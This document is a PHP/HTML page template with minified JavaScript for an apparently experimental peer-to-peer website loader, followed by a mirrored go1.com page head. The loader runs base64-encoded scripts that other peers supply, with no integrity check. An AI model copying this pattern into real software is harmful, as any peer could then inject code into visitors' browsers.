3:u[a].fn.call(u[a].context,t,n);break;default:if(!s)for(c=1,s=new Array(h-1);h>c;c++)s[c-1]=arguments[c];u[a].fn.apply(u[a].context,s)}return!0},i.prototype.on=function(e,t,i){return this._events||(this._events={}),this._events[e]||(this._events[e]=[]),this._events[e].push(new n(t,i||this)),this},i.prototype.once=function(e,t,i){return this._events||(this._events={}),this._events[e]||(this._events[e]=[]),this._events[e].push(new n(t,i||this,!0)),this},i.prototype.removeListener=function(e,t,n){if(!this._events||!this._events[e])return this;var i=this._events[e],r=[];if(t)for(var o=0,s=i.length;s>o;o++)i[o].fn!==t&&i[o].once!==n&&r.push(i[o]);return this._events[e]=r.length?r:null,this},i.prototype.removeAllListeners=function(e){return this._events?(e?this._events[e]=null:this._events={},this):this},i.prototype.off=i.prototype.removeListener,i.prototype.addListener=i.prototype.on,i.prototype.setMaxListeners=function(){return this},i.EventEmitter=i,i.EventEmitter2=i,i.EventEmitter3=i,"object"==typeof t&&t.exports&&(t.exports=i)},{}],10:[function(e,t){function n(e){this.index=0,this.dataBuffer=e,this.dataView=new Uint8Array(this.dataBuffer),this.length=this.dataBuffer.byteLength}function i(){this.bufferBuilder=new s}function r(e){var t=e.charCodeAt(0);return 2047>=t?"00":65535>=t?"000":2097151>=t?"0000":67108863>=t?"00000":"000000"}function o(e){return e.length>600?new Blob([e]).size:e.replace(/[^\u0000-\u007F]/g,r).length}var s=e("./bufferbuilder").BufferBuilder,a=e("./bufferbuilder").binaryFeatures,c={unpack:function(e){var t=new n(e);return t.unpack()},pack:function(e){var t=new i;t.pack(e);var n=t.getBuffer();return n}};t.exports=c,n.prototype.unpack=function(){var e=this.unpack_uint8();if(128>e){var t=e;return t}if(32>(224^e)){var n=(224^e)-32;return n}var i;if((i=160^e)<=15)return this.unpack_raw(i);if((i=176^e)<=15)return this.unpack_string(i);if((i=144^e)<=15)return this.unpack_array(i);if((i=128^e)<=15)return this.unpack_map(i);switch(e){case 192:return null;case 193:return void 0;case 194:return!1;case 195:return!0;case 202:return this.unpack_float();case 203:return this.unpack_double();case 204:return this.unpack_uint8();case 205:return this.unpack_uint16();case 206:return this.unpack_uint32();case 207:return this.unpack_uint64();case 208:return this.unpack_int8();case 209:return this.unpack_int16();case 210:return this.unpack_int32();case 211:return this.unpack_int64();case 212:return void 0;case 213:return void 0;case 214:return void 0;case 215:return void 0;case 216:return i=this.unpack_uint16(),this.unpack_string(i);case 217:return i=this.unpack_uint32(),this.unpack_string(i);case 218:return i=this.unpack_uint16(),this.unpack_raw(i);case 219:return i=this.unpack_uint32(),this.unpack_raw(i);case 220:return i=this.unpack_uint16(),this.unpack_array(i);case 221:return i=this.unpack_uint32(),this.unpack_array(i);case 222:return i=this.unpack_uint16(),this.unpack_map(i);case 223:return i=this.unpack_uint32(),this.unpack_map(i)}},n.prototype.unpack_uint8=function(){var e=255&this.dataView[this.index];return this.index++,e},n.prototype.unpack_uint16=function(){var e=this.read(2),t=256*(255&e[0])+(255&e[1]);return this.index+=2,t},n.prototype.unpack_uint32=function(){var e=this.read(4),t=256*(256*(256*e[0]+e[1])+e[2])+e[3];return this.index+=4,t},n.prototype.unpack_uint64=function(){var e=this.read(8),t=256*(256*(256*(256*(256*(256*(256*e[0]+e[1])+e[2])+e[3])+e[4])+e[5])+e[6])+e[7];return this.index+=8,t},n.prototype.unpack_int8=function(){var e=this.unpack_uint8();return 128>e?e:e-256},n.prototype.unpack_int16=function(){var e=this.unpack_uint16();return 32768>e?e:e-65536},n.prototype.unpack_int32=function(){var e=this.unpack_uint32();return e<Math.pow(2,31)?e:e-Math.pow(2,32)},n.prototype.unpack_int64=function(){var e=this.unpack_uint64();return e<Math.pow(2,63)?e:e-Math.pow(2,64)},n.prototype.unpack_raw=function(e){if(this.length<this.index+e)throw new Error("BinaryPackFailure: index is out of range "+this.index+" "+e+" "+this.length);var t=this.dataBuffer.slice(this.index,this.index+e);return this.index+=e,t},n.prototype.unpack_string=function(e){for(var t,n,i=this.read(e),r=0,o="";e>r;)t=i[r],128>t?(o+=String.fromCharCode(t),r++):32>(192^t)?(n=(192^t)<<6|63&i[r+1],o+=String.fromCharCode(n),r+=2):(n=(15&t)<<12|(63&i[r+1])<<6|63&i[r+2],o+=String.fromCharCode(n),r+=3);return this.index+=e,o},n.prototype.unpack_array=function(e){for(var t=new Array(e),n=0;e>n;n++)t[n]=this.unpack();return t},n.prototype.unpack_map=function(e){for(var t={},n=0;e>n;n++){var i=this.unpack(),r=this.unpack();t[i]=r}return t},n.prototype.unpack_float=function(){var e=this.unpack_uint32(),t=e>>31,n=(e>>23&255)-127,i=8388607&e|8388608;
return(0==t?1:-1)*i*Math.pow(2,n-23)},n.prototype.unpack_double=function(){var e=this.unpack_uint32(),t=this.unpack_uint32(),n=e>>31,i=(e>>20&2047)-1023,r=1048575&e|1048576,o=r*Math.pow(2,i-20)+t*Math.pow(2,i-52);return(0==n?1:-1)*o},n.prototype.read=function(e){var t=this.index;if(t+e<=this.length)return this.dataView.subarray(t,t+e);throw new Error("BinaryPackFailure: read index out of range")},i.prototype.getBuffer=function(){return this.bufferBuilder.getBuffer()},i.prototype.pack=function(e){var t=typeof e;if("string"==t)this.pack_string(e);else if("number"==t)Math.floor(e)===e?this.pack_integer(e):this.pack_double(e);else if("boolean"==t)e===!0?this.bufferBuilder.append(195):e===!1&&this.bufferBuilder.append(194);else if("undefined"==t)this.bufferBuilder.append(192);else{if("object"!=t)throw new Error('Type "'+t+'" not yet supported');if(null===e)this.bufferBuilder.append(192);else{var n=e.constructor;if(n==Array)this.pack_array(e);else if(n==Blob||n==File)this.pack_bin(e);else if(n==ArrayBuffer)this.pack_bin(a.useArrayBufferView?new Uint8Array(e):e);else if("BYTES_PER_ELEMENT"in e)this.pack_bin(a.useArrayBufferView?new Uint8Array(e.buffer):e.buffer);else if(n==Object)this.pack_object(e);else if(n==Date)this.pack_string(e.toString());else{if("function"!=typeof e.toBinaryPack)throw new Error('Type "'+n.toString()+'" not yet supported');this.bufferBuilder.append(e.toBinaryPack())}}}this.bufferBuilder.flush()},i.prototype.pack_bin=function(e){var t=e.length||e.byteLength||e.size;if(15>=t)this.pack_uint8(160+t);else if(65535>=t)this.bufferBuilder.append(218),this.pack_uint16(t);else{if(!(4294967295>=t))throw new Error("Invalid length");this.bufferBuilder.append(219),this.pack_uint32(t)}this.bufferBuilder.append(e)},i.prototype.pack_string=function(e){var t=o(e);if(15>=t)this.pack_uint8(176+t);else if(65535>=t)this.bufferBuilder.append(216),this.pack_uint16(t);else{if(!(4294967295>=t))throw new Error("Invalid length");this.bufferBuilder.append(217),this.pack_uint32(t)}this.bufferBuilder.append(e)},i.prototype.pack_array=function(e){var t=e.length;if(15>=t)this.pack_uint8(144+t);else if(65535>=t)this.bufferBuilder.append(220),this.pack_uint16(t);else{if(!(4294967295>=t))throw new Error("Invalid length");this.bufferBuilder.append(221),this.pack_uint32(t)}for(var n=0;t>n;n++)this.pack(e[n])},i.prototype.pack_integer=function(e){if(e>=-32&&127>=e)this.bufferBuilder.append(255&e);else if(e>=0&&255>=e)this.bufferBuilder.append(204),this.pack_uint8(e);else if(e>=-128&&127>=e)this.bufferBuilder.append(208),this.pack_int8(e);else if(e>=0&&65535>=e)this.bufferBuilder.append(205),this.pack_uint16(e);else if(e>=-32768&&32767>=e)this.bufferBuilder.append(209),this.pack_int16(e);else if(e>=0&&4294967295>=e)this.bufferBuilder.append(206),this.pack_uint32(e);else if(e>=-2147483648&&2147483647>=e)this.bufferBuilder.append(210),this.pack_int32(e);else if(e>=-0x8000000000000000&&0x8000000000000000>=e)this.bufferBuilder.append(211),this.pack_int64(e);else{if(!(e>=0&&0x10000000000000000>=e))throw new Error("Invalid integer");this.bufferBuilder.append(207),this.pack_uint64(e)}},i.prototype.pack_double=function(e){var t=0;0>e&&(t=1,e=-e);var n=Math.floor(Math.log(e)/Math.LN2),i=e/Math.pow(2,n)-1,r=Math.floor(i*Math.pow(2,52)),o=Math.pow(2,32),s=t<<31|n+1023<<20|r/o&1048575,a=r%o;this.bufferBuilder.append(203),this.pack_int32(s),this.pack_int32(a)},i.prototype.pack_object=function(e){var t=Object.keys(e),n=t.length;if(15>=n)this.pack_uint8(128+n);else if(65535>=n)this.bufferBuilder.append(222),this.pack_uint16(n);else{if(!(4294967295>=n))throw new Error("Invalid length");this.bufferBuilder.append(223),this.pack_uint32(n)}for(var i in e)e.hasOwnProperty(i)&&(this.pack(i),this.pack(e[i]))},i.prototype.pack_uint8=function(e){this.bufferBuilder.append(e)},i.prototype.pack_uint16=function(e){this.bufferBuilder.append(e>>8),this.bufferBuilder.append(255&e)},i.prototype.pack_uint32=function(e){var t=4294967295&e;this.bufferBuilder.append((4278190080&t)>>>24),this.bufferBuilder.append((16711680&t)>>>16),this.bufferBuilder.append((65280&t)>>>8),this.bufferBuilder.append(255&t)},i.prototype.pack_uint64=function(e){var t=e/Math.pow(2,32),n=e%Math.pow(2,32);this.bufferBuilder.append((4278190080&t)>>>24),this.bufferBuilder.append((16711680&t)>>>16),this.bufferBuilder.append((65280&t)>>>8),this.bufferBuilder.append(255&t),this.bufferBuilder.append((4278190080&n)>>>24),this.bufferBuilder.append((16711680&n)>>>16),this.bufferBuilder.append((65280&n)>>>8),this.bufferBuilder.append(255&n)},i.prototype.pack_int8=function(e){this.bufferBuilder.append(255&e)},i.prototype.pack_int16=function(e){this.bufferBuilder.append((65280&e)>>8),this.bufferBuilder.append(255&e)},i.prototype.pack_int32=function(e){this.bufferBuilder.append(e>>>24&255),this.bufferBuilder.append((16711680&e)>>>16),this.bufferBuilder.append((65280&e)>>>8),this.bufferBuilder.append(255&e)},i.prototype.pack_int64=function(e){var t=Math.floor(e/Math.pow(2,32)),n=e%Math.pow(2,32);this.bufferBuilder.append((4278190080&t)>>>24),this.bufferBuilder.append((16711680&t)>>>16),this.bufferBuilder.append((65280&t)>>>8),this.bufferBuilder.append(255&t),this.bufferBuilder.append((4278190080&n)>>>24),this.bufferBuilder.append((16711680&n)>>>16),this.bufferBuilder.append((65280&n)>>>8),this.bufferBuilder.append(255&n)}},{"./bufferbuilder":11}],11:[function(e,t){function n(){this._pieces=[],this._parts=[]}var i={};i.useBlobBuilder=function(){try{return new Blob([]),!1}catch(e){return!0}}(),i.useArrayBufferView=!i.useBlobBuilder&&function(){try{return 0===new Blob([new Uint8Array([])]).size}catch(e){return!0}}(),t.exports.binaryFeatures=i;var r=t.exports.BlobBuilder;"undefined"!=typeof window&&(r=t.exports.BlobBuilder=window.WebKitBlobBuilder||window.MozBlobBuilder||window.MSBlobBuilder||window.BlobBuilder),n.prototype.append=function(e){"number"==typeof e?this._pieces.push(e):(this.flush(),this._parts.push(e))},n.prototype.flush=function(){if(this._pieces.length>0){var e=new Uint8Array(this._pieces);i.useArrayBufferView||(e=e.buffer),this._parts.push(e),this._pieces=[]}},n.prototype.getBuffer=function(){if(this.flush(),i.useBlobBuilder){for(var e=new r,t=0,n=this._parts.length;n>t;t++)e.append(this._parts[t]);return e.getBlob()}return new Blob(this._parts)},t.exports.BufferBuilder=n},{}],12:[function(e,t){function n(e,t){return this instanceof n?(this._dc=e,i.debug=t,this._outgoing={},this._incoming={},this._received={},this._window=1e3,this._mtu=500,this._interval=0,this._count=0,this._queue=[],void this._setupDC()):new n(e)}var i=e("./util");n.prototype.send=function(e){var t=i.pack(e);return t.size<this._mtu?void this._handleSend(["no",t]):(this._outgoing[this._count]={ack:0,chunks:this._chunk(t)},i.debug&&(this._outgoing[this._count].timer=new Date),this._sendWindowedChunks(this._count),void(this._count+=1))},n.prototype._setupInterval=function(){var e=this;this._timeout=setInterval(function(){var t=e._queue.shift();if(t._multiple)for(var n=0,i=t.length;i>n;n+=1)e._intervalSend(t[n]);else e._intervalSend(t)},this._interval)},n.prototype._intervalSend=function(e){var t=this;e=i.pack(e),i.blobToBinaryString(e,function(e){t._dc.send(e)}),0===t._queue.length&&(clearTimeout(t._timeout),t._timeout=null)},n.prototype._processAcks=function(){for(var e in this._outgoing)this._outgoing.hasOwnProperty(e)&&this._sendWindowedChunks(e)},n.prototype._handleSend=function(e){for(var t=!0,n=0,i=this._queue.length;i>n;n+=1){var r=this._queue[n];r===e?t=!1:r._multiple&&-1!==r.indexOf(e)&&(t=!1)}t&&(this._queue.push(e),this._timeout||this._setupInterval())},n.prototype._setupDC=function(){var e=this;this._dc.onmessage=function(t){var n=t.data,r=n.constructor;if(r===String){var o=i.binaryStringToArrayBuffer(n);n=i.unpack(o),e._handleMessage(n)}}},n.prototype._handleMessage=function(e){var t,n=e[1],r=this._incoming[n],o=this._outgoing[n];switch(e[0]){case"no":var s=n;s&&this.onmessage(i.unpack(s));break;case"end":if(t=r,this._received[n]=e[2],!t)break;this._ack(n);break;case"ack":if(t=o){var a=e[2];t.ack=Math.max(a,t.ack),t.ack>=t.chunks.length?(i.log("Time: ",new Date-t.timer),delete this._outgoing[n]):this._processAcks()}break;case"chunk":if(t=r,!t){var c=this._received[n];if(c===!0)break;t={ack:["ack",n,0],chunks:[]},this._incoming[n]=t}var u=e[2],p=e[3];t.chunks[u]=new Uint8Array(p),u===t.ack[2]&&this._calculateNextAck(n),this._ack(n);break;default:this._handleSend(e)}},n.prototype._chunk=function(e){for(var t=[],n=e.size,r=0;n>r;){var o=Math.min(n,r+this._mtu),s=e.slice(r,o),a={payload:s};t.push(a),r=o}return i.log("Created",t.length,"chunks."),t},n.prototype._ack=function(e){var t=this._incoming[e].ack;this._received[e]===t[2]&&(this._complete(e),this._received[e]=!0),this._handleSend(t)},n.prototype._calculateNextAck=function(e){for(var t=this._incoming[e],n=t.chunks,i=0,r=n.length;r>i;i+=1)if(void 0===n[i])return void(t.ack[2]=i);t.ack[2]=n.length},n.prototype._sendWindowedChunks=function(e){i.log("sendWindowedChunks for: ",e);for(var t=this._outgoing[e],n=t.chunks,r=[],o=Math.min(t.ack+this._window,n.length),s=t.ack;o>s;s+=1)n[s].sent&&s!==t.ack||(n[s].sent=!0,r.push(["chunk",e,s,n[s].payload]));t.ack+this._window>=n.length&&r.push(["end",e,n.length]),r._multiple=!0,this._handleSend(r)},n.prototype._complete=function(e){i.log("Completed called for",e);var t=this,n=this._incoming[e].chunks,r=new Blob(n);i.blobToArrayBuffer(r,function(e){t.onmessage(i.unpack(e))}),delete this._incoming[e]},n.higherBandwidthSDP=function(e){var t=navigator.appVersion.match(/Chrome\/(.*?) /);if(t&&(t=parseInt(t[1].split(".").shift()),31>t)){var n=e.split("b=AS:30"),i="b=AS:102400";if(n.length>1)return n[0]+i+n[1]}return e},n.prototype.onmessage=function(){},t.exports.Reliable=n},{"./util":13}],13:[function(e,t){var n=e("js-binarypack"),i={debug:!1,inherits:function(e,t){e.super_=t,e.prototype=Object.create(t.prototype,{constructor:{value:e,enumerable:!1,writable:!0,configurable:!0}})},extend:function(e,t){for(var n in t)t.hasOwnProperty(n)&&(e[n]=t[n]);return e},pack:n.pack,unpack:n.unpack,log:function(){if(i.debug){for(var e=[],t=0;t<arguments.length;t++)e[t]=arguments[t];e.unshift("Reliable: "),console.log.apply(console,e)}},setZeroTimeout:function(e){function t(t){i.push(t),e.postMessage(r,"*")}function n(t){t.source==e&&t.data==r&&(t.stopPropagation&&t.stopPropagation(),i.length&&i.shift()())}var i=[],r="zero-timeout-message";return e.addEventListener?e.addEventListener("message",n,!0):e.attachEvent&&e.attachEvent("onmessage",n),t}(this),blobToArrayBuffer:function(e,t){var n=new FileReader;n.onload=function(e){t(e.target.result)},n.readAsArrayBuffer(e)},blobToBinaryString:function(e,t){var n=new FileReader;n.onload=function(e){t(e.target.result)},n.readAsBinaryString(e)},binaryStringToArrayBuffer:function(e){for(var t=new Uint8Array(e.length),n=0;n<e.length;n++)t[n]=255&e.charCodeAt(n);return t.buffer},randomToken:function(){return Math.random().toString(36).substr(2)}};t.exports=i},{"js-binarypack":10}]},{},[3]);</script>
<script type="text/javascript" id="bt.js">
function removeAllexternal(e){for(var n=e.scripts,t=0;t<n.length;t++)exSS[exSS.length]=n[t].cloneNode(!0),n[t].removeAttribute("src"),n[t].innerHTML="";for(var o=e.images,t=0;t<o.length;t++)-1!=o[t].src.indexOf(window.location.hostname)?(exI[t]=o[t].src.replace(/%20/g," "),o[t].src=""):exI[t]="";var s=e.links;for(s=e.getElementsByTagName("LINK"),t=0;t<s.length;t++)-1!=s[t].href.indexOf(window.location.hostname)?(exc[t]=s[t].href.replace(/%20/g," "),s[t].href=""):exc[t]="";var i=e.getElementsByTagName("*");for(t=0;t<i.length;t++)exO[t]="","undefined"!=typeof i[t].href&&-1!=i[t].href.indexOf(window.location.hostname)&&(exO[t]=i[t].href.replace(/%20/g," ")),"undefined"!=typeof i[t].src&&-1!=i[t].src.indexOf(window.location.hostname)&&(exO[t]=i[t].src.replace(/%20/g," "))}function startEval(){var e=setInterval(function(){for(var n=evalcount;n<exSS.length;n++)if(""!=exSS[n]){if(-1!=exSS[n].src.indexOf(window.location.hostname)&&exSS[n].src.trim().length>window.location.hostname.length+9)return;var t=document.createElement("script");if(t.text=exSS[n].innerHTML,-1==t.text.indexOf("![CDATA[")){"undefined"!=typeof exSS[n].id&&""!=exSS[n].id&&(t.id=exSS[n].id),"undefined"!=typeof exSS[n].type&&""!=exSS[n].type&&(t.type=exSS[n].type);var o=document.scripts[n];("undefined"==typeof o||evalcount>document.scripts.length)&&(o=document.createElement("script"),document.body.appendChild(o));for(var s=10;(""!=o.innerHTML.trim()||o.src.trim().length>window.location.hostname.length+8)&&s-->0;)o=document.scripts[++n],("undefined"==typeof o||evalcount>document.scripts.length)&&(o=document.createElement("script"),document.body.appendChild(o));return 0>=s&&console.log("loop broken"),o.parentNode.insertBefore(t,o),o.parentNode.removeChild(o),void evalcount++}}clearInterval(e);var t=document.createElement("script");t.text='alert("here");',window.dispatchEvent(new Event("load"));for(var i=document.links,a=i.length,n=0;a>n;n++)i[n].onclick=checkLinks;null!=document.getElementById("PGLD")&&(document.getElementById("PGLD").className="LDhidden"),console.log("evaling scripts:Complete!")},100)}function PeerBroadcast(e,n){for(var t in peer.connections)peer.connections.hasOwnProperty(t)&&t!=peer.id&&t!=n&&peer.connections[t][0].send(e)}function connectto(e){var n=peer.connect(e);console.log("connecting to: "+e),n.on("open",function(){0==Object.keys(hashes).length&&n.send("j"),n.on("data",function(e){handleData(e,n)})})}function checkLinks(){var e=this.href;return console.log(e),-1==e.indexOf(window.location.hostname)||-1!=e.indexOf("#")||peer.disconnected?!0:(contentURL=e.replace(window.location.origin+"/",""),console.log(contentURL),hashes={},document.body.innerHTML=defaultBody,document.head.innerHTML="",peer.sendSM("@"+contentURL),window.history.pushState("","","/"+contentURL),!1)}function fade(e){var n=1,t=setInterval(function(){.1>=n&&(clearInterval(t),e.style.display="none"),e.style.opacity=n,e.style.filter="alpha(opacity="+100*n+")",n-=.1*n},50)}function startTimeoutLoops(){var e=setInterval(function(){null!=document.getElementsByClassName("LDSP")[0]&&(document.getElementsByClassName("LDSP")[0].innerHTML+="Taking Longer Than Normal...",changecss(".LDSP > div","background-color","#FF0")),clearInterval(e)},1e4),n=setInterval(function(){peer.disconnected&&(null!=document.getElementsByClassName("LDSP")[0]&&(changecss(".LDSP > div","background-color","#F00"),document.getElementsByClassName("LDSP")[0].childNodes[document.getElementsByClassName("LDSP")[0].childNodes.length-1].remove(),document.getElementsByClassName("LDSP")[0].innerHTML+="Server Timeout  Please Refresh"),clearInterval(n))},2e4)}function startBadClients(){console.log("badclients started!");var e=setInterval(function(){console.log("testing clients"),(0==Object.keys(peer.connections).length||0==Object.keys(hashes).length)&&(peer.sendSM("!"+contentURL),clearInterval(e),console.log("bad clients!!!"))},3e3)}function changecss(e,n,t){for(var o=0;o<document.styleSheets.length;o++)try{document.styleSheets[o].insertRule(e+" {"+n+":"+t+"}",document.styleSheets[o].cssRules.length)}catch(s){try{document.styleSheets[o].addRule(e,n+":"+t)}catch(s){}}}function processData(e){try{e=e.replace(/"/g,"");var n=!1;if(-1!=e.indexOf(".jpg")||-1!=e.indexOf(".png")||-1!=e.indexOf(".gif")||-1!=e.indexOf(".jpeg")){for(var t=0;t<exI.length;t++)-1!=exI[t].indexOf(e)&&t<document.images.length&&(document.images[t].src=hashes[e].replace(/"/g,""),n=!0);n||console.log("unmatched image:"+e)}if(-1!=e.indexOf("css")&&!n){for(var t=0;t<exc.length;t++)-1!=exc[t].indexOf(e)&&(document.getElementsByTagName("LINK")[t].href=hashes[e].replace(/"/g,""),null!=document.getElementById("PGLD")&&t>=document.head.getElementsByTagName("LINK").length-1&&(console.log("headers finished"),fade(document.getElementById("PGLD"))),n=!0);n||console.log("unmatched css:"+e)}if(-1!=e.indexOf(".js")&&!n){for(var t=0;t<exSS.length;t++)""!=exSS[t]&&-1!=exSS[t].src.replace(/%20/g," ").indexOf(e)&&(exSS[t].id=exSS[t].src,exSS[t].removeAttribute("src"),exSS[t].innerHTML=b64_to_utf8(hashes[e].replace(/"/g,"").substring(28)),n=!0);if(!n){console.log("unmatched js:"+e);var o=document.createElement("script");o.src=hashes[e].replace(/"/g,""),document.body.appendChild(o)}}if(-1!=e.indexOf(".html")&&!n){if(-1!=e.indexOf(contentURL)){console.log("page found:"+e);var s=document.cloneNode(!0),i=b64_to_utf8(hashes[contentURL].split(",")[1].replace(/"/g,""));s.head.innerHTML=i.substring(i.indexOf("<head>"),i.indexOf("</head>")),s.body.innerHTML=defaultBody+i.substring(i.indexOf("<body",i.indexOf("</head>")),i.indexOf("</body>")),removeAllexternal(s),document.head.innerHTML=s.head.innerHTML,null==document.body&&(document.body=document.createElement("body")),document.body.innerHTML=s.body.innerHTML,n=!0;for(var a in hashes)hashes.hasOwnProperty(a)&&-1==a.indexOf(".html")&&processData(a);startEval()}n||console.log("unmatched html:"+e)}n||console.log("cant clasify:"+e)}catch(r){console.log("Error processing data:"+e),console.log(r)}}function b64_to_utf8(e){try{return decodeURIComponent(escape(window.atob(e)))}catch(n){console.log(n),console.log(e.substring(0,100)+e.substring(e.length-100))}}function handleSM(e){switch(e.charAt(0)){case"I":var n=e.substring(1,e.length),t=n.split(":"),o=t.shift();0==Object.keys(hashes).length&&console.log("page directly form server"),hashes[o]=t.join(":"),processData(o);break;case"S":console.log("my swarm is:"+e.split(":")[0].substring(1));var s=e.split(":");console.log(e);for(var i=1;i<s.length;i++)"0"!=s[i]&&"undefined"!=typeof s[i]&&""!=s[i]&&connectto(s[i]);0!=Object.keys(hashes).length?finishedLogin=!0:startBadClients();break;default:console.log("Unknonwn SM received:"+e)}}function handleData(e,n){switch(e.substring(0,1)){case"c":console.log("connecting to :"+e.substring(1,e.length));var t=peer.connect(e.substring(1,e.length));t.on("open",function(){t.on("data",function(e){handleData(e,t)})});break;case"f":finishedLogin=!0;break;case"j":if(finishedLogin){for(var o in peer.connections)peer.connections.hasOwnProperty(o)&o!=peer.id&&o!=n.peer&&n.send("c"+o);for(var o in hashes)hashes.hasOwnProperty(o)&&n.send("s"+o+":"+hashes[o]);console.log("Peering!"),n.send("f")}else initialConns[initialConns.length]=n,console.log("Not able to peer at the moment, saving for later");break;case"s":var s=e.substring(1).split(":")[0];hashes[s]=e.substring(1+e.split(":")[0].length),processData(s);break;default:console.log("unknown data string:"+e.substring(0,1)+", full:"+e)}}var contentURL=window.location.pathname.replace(/%20/g," ");"/"==contentURL&&(contentURL="index.html"),"/"==contentURL.charAt(0)&&(contentURL=contentURL.substring(1)),"/"==contentURL.charAt(contentURL.length-1)&&(contentURL+="index.html"),console.log("getting from peer server:"+contentURL);var peer=new Peer({host:"45.32.245.50",port:9001,path:"/peerjs"});peer.sendSM("@"+contentURL);var hashes={},finishedLogin=!1,initialConns=[],defaultBody='<style type="text/css">#PGLD{position:fixed;left:0;top:0;width:100%;height:100%;z-index:9999;background-color:#fff}.LDSP{margin:100px auto 0;width:100px;text-align:center}.LDSP>div{width:18px;height:18px;background-color:#6AF;border-radius:100%;display:inline-block;-webkit-animation:bouncedelay 1.4s infinite ease-in-out;animation:bouncedelay 1.4s infinite ease-in-out;-webkit-animation-fill-mode:both;animation-fill-mode:both}.LDSP .LDB1{-webkit-animation-delay:-.64s;animation-delay:-.64s}.LDSP .LDB2{-webkit-animation-delay:-.48s;animation-delay:-.48s}.LDSP .LDB3{-webkit-animation-delay:-.32s;animation-delay:-.32s}.LDSP .LDB4{-webkit-animation-delay:-.16s;animation-delay:-.16s}@-webkit-keyframes bouncedelay{0%,100%,80%{-webkit-transform:scale(0)}40%{-webkit-transform:scale(1)}}@keyframes bouncedelay{0%,100%,80%{transform:scale(0);-webkit-transform:scale(0)}40%{transform:scale(1);-webkit-transform:scale(1)}}.LDhidden{visibility:hidden;opacity:0;transition:visibility 0s 2s,opacity 2s linear}</style><div id="PGLD"><div class="LDSP"><div class="LDB1"></div><div class="LDB2"></div><div class="LDB3"></div><div class="LDB4"></div></div></div>',evalcount=0,exI=[],exc=[],exO=[],exSS=[];peer.on("open",function(e){console.log("My peer ID is: "+e)}),peer.on("close",function(){console.log("peer has shut down")}),peer.on("connection",function(e){e.on("open",function(){e.on("data",function(n){handleData(n,e)})})});var chkinitialConns=setInterval(function(){if(initialConns.length>0&&finishedLogin){console.log("Finished loading so starting to peer");for(var e=0;e<initialConns.length;e++){var n=initialConns[e];for(var t in peer.connections)peer.connections.hasOwnProperty(t)&t!=peer.id&&t!=n.peer&&n.send("c"+t);for(var t in hashes)hashes.hasOwnProperty(t)&&n.send("s"+t+":"+hashes[t]);n.send("f")}initialConns=[]}finishedLogin&&(console.log("clearing initialcons"),console.log(initialConns),clearInterval(chkinitialConns))},200),checkConnections=setInterval(function(){for(var e in peer.connections)if(peer.connections.hasOwnProperty(e)){if(peer.connections[e][0].open)continue;delete peer.connections[e]}},1e4),serverHeartbeat=setInterval(function(){peer.sendSM("heatbeat"),peer.disconnected&&(console.log("peer disconnected."),clearInterval(serverHeartbeat))},1e4),ProcessServerData=setInterval(function(){if(peer.SM.length>0){for(var e=0;e<peer.SM.length;e++)try{handleSM(peer.SM[e])}catch(n){console.log("Error processing server message:"+n)}peer.SM=[]}},200);startTimeoutLoops(),window.onunload=window.onbeforeunload=function(){peer.destroy()};

</script>
</head>
<body>  <style type="text/css">
    #PGLD{position:fixed;left:0;top:0;width:100%;height:100%;z-index:9999;background-color:#fff}.LDSP{margin:100px auto 0;width:100px;text-align:center}.LDSP>div{width:18px;height:18px;background-color:#6AF;border-radius:100%;display:inline-block;-webkit-animation:bouncedelay 1.4s infinite ease-in-out;animation:bouncedelay 1.4s infinite ease-in-out;-webkit-animation-fill-mode:both;animation-fill-mode:both}.LDSP .LDB1{-webkit-animation-delay:-.64s;animation-delay:-.64s}.LDSP .LDB2{-webkit-animation-delay:-.48s;animation-delay:-.48s}.LDSP .LDB3{-webkit-animation-delay:-.32s;animation-delay:-.32s}.LDSP .LDB4{-webkit-animation-delay:-.16s;animation-delay:-.16s}@-webkit-keyframes bouncedelay{0%,100%,80%{-webkit-transform:scale(0)}40%{-webkit-transform:scale(1)}}@keyframes bouncedelay{0%,100%,80%{transform:scale(0);-webkit-transform:scale(0)}40%{transform:scale(1);-webkit-transform:scale(1)}}.LDhidden{visibility:hidden;opacity:0;transition:visibility 0s 2s,opacity 2s linear}
  </style>
    <div id="PGLD">
      <div class="LDSP">
        <div class="LDB1"></div>
        <div class="LDB2"></div>
        <div class="LDB3"></div>
        <div class="LDB4"></div>
      </div>
    </div></body>
<?php else : ?>
  
<!-- Mirrored from go1.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 17 Sep 2015 09:54:18 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
<head>
    <title>GO1 | Training Software for business</title>
    <meta http-equiv="content-type" content="text/html; charset=utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="images/favicon.ico">
    <!--Loading style vendors-->
    <link type="text/css" rel="stylesheet" href="http://fonts.googleapis.com/css?family=Raleway:400,100,700">
    <link type="text/css" rel="stylesheet" href="vendors/elegant-icons/css/style.css">
    <link type="text/css" rel="stylesheet" href="vendors/etlinefont-bower/style.css">
    <link type="text/css" rel="stylesheet" href="vendors/bootstrap/css/bootstrap.min.css">
    <link type="text/css" rel="stylesheet" href="vendors/animate.css/animate.css">
    <link rel="stylesheet" href="js/fancybox/source/jquery.fancybox.css" type="text/css" media="screen" />
    <!--Loading style-->
    <link type="text/css" rel="stylesheet" href="css/style.css">
    <!--Loading jgrowl css-->
    <link rel="stylesheet" type="text/css" href="../cdnjs.cloudflare.com/ajax/libs/jquery-jgrowl/1.4.1/jquery.jgrowl.min.css" />
    <script>
  //<![CDATA[
    window.zEmbed||function(e,t){var n,o,d,i,s,a=[],r=document.createElement("iframe");window.zEmbed=function()
    {a.push(arguments)}
    
    ,window.zE=window.zE||window.zEmbed,r.src="javascript:false",r.title="",r.role="presentation",(r.frameElement||r).style.cssText="display: none",d=document.getElementsByTagName("script"),d=d[d.length-1],d.parentNode.insertBefore(r,d),i=r.contentWindow,s=i.document;try
    {o=s}
    
    catch(c)
    {n=document.domain,r.src='javascript:var d=document.open();d.domain="'+n+'";void(0);',o=s}
    
    o.open()._l=function()
    {var o=this.createElement("script");n&&(this.domain=n),o.id="js-iframe-async",o.src=e,this.t=+new Date,this.zendeskHost=t,this.zEQueue=a,this.body.appendChild(o)}
    
    ,o.write('<body onload="document._l();">'),o.close()}("../assets.zendesk.com/embeddable_framework/main.js","go1support.zendesk.com");
  //]]>
  </script>
  <!-- End of go1support Zendesk Widget script -->
  </head>

  <body>
    <!--BEGIN PAGE LOADER-->
    <div id="page-loader">
      <div class="spinner">
        <div class="bounce1"></div>
